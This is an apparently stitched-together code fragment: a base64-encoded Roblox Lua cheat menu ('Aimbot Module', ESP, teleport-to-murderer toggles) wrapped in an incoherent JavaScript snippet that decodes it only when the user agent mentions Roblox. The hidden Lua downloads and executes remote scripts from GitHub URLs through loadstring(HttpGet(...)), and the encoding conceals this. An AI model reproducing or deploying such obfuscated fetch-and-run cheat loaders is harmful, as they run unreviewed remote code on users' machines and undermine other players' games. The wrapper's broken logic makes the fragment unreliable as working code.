S0tLS0tLSAkaWxlbmNlLld0ZiBBaW1ib3QgTW9kdWxlIDIwMjUgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL25vdG15cy9NaWNVcC9yZWZzL2hlYWRzL21haW4vQWltYm90TW9kdWxlLmx1YSIpKSgpIC0tIFJlcGxhY2Ugd2l0aCBhY3R1YWwgUGFzdGViaW4gVVJMCgpUYWI0OkNyZWF0ZVRvZ2dsZSh7CiAgICBOYW1lID0gIkFpbWJvdCAoVU5EKSIsCiAgICBDdXJyZW50VmFsdWUgPSBmYWxzZSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24odmFsdWUpCiAgICAgICAgVG9nZ2xlQWltYm90KHZhbHVlKQogICAgZW5kCn0pCgpUYWI0OkNyZWF0ZUJ1dHRvbih7CiAgICBOYW1lID0gIlRlc3QgQnV0dG9uIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24odmFsdWUpCiAgICAgICAgdHBUb011cmRlcmVyKHZhbHVlKQogICAgZW5kCn0pCgpUYWI0OkNyZWF0ZURyb3Bkb3duKHsKICAgIE5hbWUgPSAiVGVzdCBEcm9wZG93biIsCiAgICBPcHRpb25zID0geyJPcHRpb24gMSIsICJPcHRpb24gMiIsICJPcHRpb24gMyJ9LAogICAgQ3VycmVudE9wdGlvbiA9IHsiT3B0aW9uIDEifSwKICAgIE11bHRpcGxlT3B0aW9ucyA9IGZhbHNlLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzZWxlY3RlZCkKICAgICAgICBwcmludCgiU2VsZWN0ZWQgb3B0aW9uczoiLCB0YWJsZS5jb25jYXQoc2VsZWN0ZWQsICIsICIpKQogICAgZW5kCn0pCgpUYWI1OkNyZWF0ZUxhYmVsKHsKICAgIE5hbWUgPSAiRXNwIiwKfSkKClRhYjU6Q3JlYXRlQnV0dG9uKHsKICAgIE5hbWUgPSAiVGVzdCBCdXR0b24iLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgCiAgICBlbmQKfSkKClRhYjU6Q3JlYXRlRHJvcGRvd24oewogICAgTmFtZSA9ICJUZXN0IERyb3Bkb3duIiwKICAgIE9wdGlvbnMgPSB7Ik9wdGlvbiAxIiwgIk9wdGlvbiAyIiwgIk9wdGlvbiAzIn0sCiAgICBDdXJyZW50T3B0aW9uID0geyJPcHRpb24gMSJ9LAogICAgTXVsdGlwbGVPcHRpb25zID0gZmFsc2UsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHNlbGVjdGVkKQogICAgICAgIHByaW50KCJTZWxlY3RlZCBvcHRpb25zOiIsIHRhYmxlLmNvbmNhdChzZWxlY3RlZCwgIiwgIikpCiAgICBlbmQKfSkKCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0gJGlsZW5jZS5XdGYgRVNQIE1vZHVsZSAyMDI1IC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9ub3RteXMvTWljVXAvcmVmcy9oZWFkcy9tYWluL0VzcE1vZHVsZS5sdWEiKSkoKQoKVGFiNTpDcmVhdGVUb2dnbGUoewogICAgTmFtZSA9ICJTa2VsZXRvbiBFU1AiLAogICAgQ3VycmVudFZhbHVlID0gZmFsc2UsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHZhbHVlKQogICAgICAgIFRvZ2dsZVNrZWxldG9uKHZhbHVlKQogICAgZW5kCn0pCgpUYWI1OkNyZWF0ZVRvZ2dsZSh7CiAgICBOYW1lID0gIk5hbWVUYWdzIEVTUCIsCiAgICBDdXJyZW50VmFsdWUgPSBmYWxzZSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24odmFsdWUpCiAgICAgICAgVG9nZ2xlTmFtZVRhZ3ModmFsdWUpCiAgICBlbmQKfSkKClRhYjU6Q3JlYXRlVG9nZ2xlKHsKICAgIE5hbWUgPSAiVHJhY2VycyBFU1AiLAogICAgQ3VycmVudFZhbHVlID0gZmFsc2UsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHZhbHVlKQogICAgICAgIFRvZ2dsZVRyYWNlcnModmFsdWUpCiAgICBlbmQKfSkKClRhYjU6Q3JlYXRlVG9nZ2xlKHsKICAgIE5hbWUgPSAiM0QgQm94IEVTUCIsCiAgICBDdXJyZW50VmFsdWUgPSBmYWxzZSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24odmFsdWUpCiAgICAgICAgVG9nZ2xlQm94M0QodmFsdWUpCiAgICBlbmQKfSkKClRhYjU6Q3JlYXRlVG9nZ2xlKHsKICAgIE5hbWUgPSAiMkQgQm94IEVTUCIsCiAgICBDdXJyZW50VmFsdWUgPSBmYWxzZSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24odmFsdWUpCiAgICAgICAgVG9nZ2xlQm94MkQodmFsdWUpCiAgICBlbmQKfSkKClRhYjY6Q3JlYXRlTGFiZWwoewogICAgTmFtZSA9ICJTZXR0aW5ncyIsCn0pCgpUYWI2OkNyZWF0ZUJ1dHRvbih7CiAgICBOYW1lID0gIlRlc3QgQnV0dG9uIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIAogICAgZW5kCn0pCgpUYWI2OkNyZWF0ZURyb3Bkb3duKHsKICAgIE5hbWUgPSAiVGVzdCBEcm9wZG93biIsCiAgICBPcHRpb25zID0geyJPcHRpb24gMSIsICJPcHRpb24gMiIsICJPcHRpb24gMyJ9LAogICAgQ3VycmVudE9wdGlvbiA9IHsiT3B0aW9uIDEifSwKICAgIE11bHRpcGxlT3B0aW9ucyA9IGZhbHNlLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzZWxlY3RlZCkKICAgICAgICBwcmludCgiU2VsZWN0ZWQgb3B0aW9uczoiLCB0YWJsZS5jb25jYXQoc2VsZWN0ZWQsICIsICIpKQogICAgZW5kCn0pCgpUYWI2OkNyZWF0ZVRvZ2dsZSh7CiAgICBOYW1lID0gIlRlc3QgVG9nZ2xlIiwKICAgIEN1cnJlbnRWYWx1ZSA9IGZhbHNlLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih2YWx1ZSkKICAgICAgICBpZiB2YWx1ZSA9PSB0cnVlIHRoZW4gCiAgICAgICAgICAgIHByaW50KHRydWUpCiAgICAgICAgZWxzZQogICAgICAgICAgICBwcmludChmYWxzZSkKICAgICAgICBlbmQKICAgIGVuZAp9KQoKVGFiNjpDcmVhdGVUb2dnbGUoewogICAgTmFtZSA9ICJOYW1ldGFnIChMb2NhbCkiLAogICAgQ3VycmVudFZhbHVlID0gdHJ1ZSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24odmFsdWUpCiAgICAgICAgcmFua1RhZ2dlck1vZHVsZS50b2dnbGVPd25UYWcodmFsdWUpCiAgICBlbmQKfSkKLS1bWwpUYWIxOkNyZWF0ZVBhcmFncmFwaCh7CiAgICBUaXRsZSA9ICJXZWxjb21lIiwKICAgIENvbnRlbnQgPSAiIgp9KQpdXQoKbG9jYWwgUnVuU2VydmljZSA9IGdhbWU6R2V0U2VydmljZSgiUnVuU2VydmljZSIpCmxvY2FsIGNvbm5lY3Rpb24KCmNvbm5lY3Rpb24gPSBSdW5TZXJ2aWNlLkhlYXJ0YmVhdDpDb25uZWN0KGZ1bmN0aW9uKCkKICAgIGlmIGd1aS5QYXJlbnQgdGhlbgogICAgICAgIGd1aS5EaXNwbGF5T3JkZXIgPSA5OTk5CiAgICBlbHNlCiAgICAgICAgY29ubmVjdGlvbjpEaXNjb25uZWN0KCkKICAgIGVuZAplbmQp";
if (navigator.userAgent.includes('Roblox')) {
  atob(encoded);
}
